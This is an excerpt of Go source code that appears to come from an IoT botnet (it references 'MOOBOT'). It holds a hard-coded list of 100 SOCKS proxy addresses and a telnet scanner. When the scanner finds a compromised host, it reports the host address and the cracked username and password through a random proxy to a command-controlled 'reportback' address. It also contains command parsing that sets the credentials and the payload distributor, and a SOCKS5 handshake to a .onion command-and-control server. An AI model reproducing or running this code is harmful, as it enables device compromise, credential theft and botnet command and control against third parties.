...
var torSocks = [100]string{"169.60.174.184:9981", "52.116.25.174:9443", "84.53.239.112:8888", "34.202.220.218:9090", "62.210.92.188:10000", "169.61.54.38:9500", "169.61.54.38:9869", "89.223.92.30:9001", "95.161.207.19:443", "163.172.67.239:8001", 
						   "94.180.162.141:7777", "52.116.25.164:9443", "169.61.54.38:10250", "34.193.167.54:9090", "193.37.213.7:9191", "207.180.199.103:10000", "52.116.25.164:9981", "195.9.134.86:8888", "169.60.174.184:9944", "45.32.238.250:9080", 
						   "67.216.204.113:8001", "95.189.139.235:8080", "52.116.25.164:9943", "52.116.25.164:9944", "167.179.112.185:8083", "169.61.54.38:9210", "46.161.40.104:9001", "52.116.25.174:10250", "52.116.25.174:9663", "104.248.72.195:9000",
						   "173.249.40.133:50050", "169.60.174.184:9998", "169.61.54.42:9944", "31.131.23.68:443", "91.92.205.188:9222", "154.223.131.228:88", "52.116.25.164:9305", "52.116.25.164:9295", "169.61.54.38:9743", "52.5.229.203:9090", 
						   "89.223.92.30:9011", "159.89.155.142:9090", "45.82.136.38:8080", "47.88.155.205:9050", "52.116.25.164:9704", "185.148.83.130:443", "185.112.36.132:9090", "52.116.25.174:9869", "124.156.181.63:9050", "164.68.101.118:50070", 
						   "169.60.174.184:10000", "169.61.54.38:9443", "77.246.158.77:9101", "66.175.217.74:9001", "167.86.103.90:50070", "5.8.64.18:9104", "185.82.219.12:9050", "34.226.35.71:9090", "95.179.158.83:9050", "89.223.92.30:9009", 
						   "191.252.186.230:9050", "89.223.92.30:9019", "89.223.92.30:9000", "89.223.92.30:9007", "169.61.54.38:9981", "169.61.54.38:9943", "167.86.121.208:50050", "52.116.25.164:10000", "52.116.25.164:10250", "212.73.150.166:9191", 
						   "167.86.89.42:50050", "45.33.45.151:9191", "52.116.25.174:9944", "169.60.174.184:9443", "169.60.174.184:9765", "169.61.54.38:9944", "169.61.54.38:9295", "169.61.54.42:9869", "52.116.25.164:9310", "89.18.136.217:8001", 
						   "52.116.25.164:9216", "93.179.80.174:9080", "52.116.25.174:10243", "169.60.174.184:9595", "169.60.174.184:10250", "139.180.204.84:9251", "51.68.136.6:8010", "169.61.54.42:9215", "169.61.54.42:9981", "3.208.137.175:9090", 
						   "69.61.54.42:10243", "81.12.107.2:8140", "169.61.54.42:9302", "52.116.25.164:9302", "158.69.207.13:9050", "34.198.131.11:9090", "169.60.174.184:9869", "89.223.92.30:9002", "169.61.54.38:10243", "93.104.214.155:9050"}
...
func connectTorSock() (int, net.Conn) {
	...
	for attempts = 0; attempts < 5; attempts++ {
		conn, err = net.DialTimeout("tcp", torSocks[rand.Intn(100)], 8 * time.Second)
		if err != nil {
			continue
		}
...
func scanReport(reportBuf string) (int) {

	ret, conn := connectTorSock()
	if ret == 0 || conn == nil {
		return 0
	}
	...
	conn.Write([]byte("\x05\x01\x00\x03\x16" + reportBack + "\x3E\x7B"))
	len, err = conn.Read(buf)
	if err != nil || len <= 0 {
		return 0
	}
...
func scanFunction(targetHost string) {
	...
	for i := 0; i < 2; i++ {
		...
		if strings.Contains(string(buf), "MOOBOT: applet not found") {
			scanReport(targetHost + ":" + telnetPort + " " + tnUser + ":" + tnPass)
			break
		} else if i >= 2 {
			conn.Close()
			return
...
func attackParse(buf []string) {
	...
	if (strings.Contains(buf[0], "get")) {
		...
		tnUser = buf[1]
		tnPass = buf[2]
	} else if (strings.Contains(buf[0], "distrubter")) {
		Distrubuter = buf[1]
	} else if (strings.Contains(buf[0], "reportback")) {
		reportBack = buf[1]
...
func connectWithProxy() (retVal int, conn net.Conn) {
	...
	conn.Write([]byte("\x05\x01\x00\x03\x16jmkc2dlkd2l45h37.onion\x3A\x93"))
	len, err = conn.Read(buf)
	if err != nil || len <= 0 {
		conn.Close()
		return 0, nil
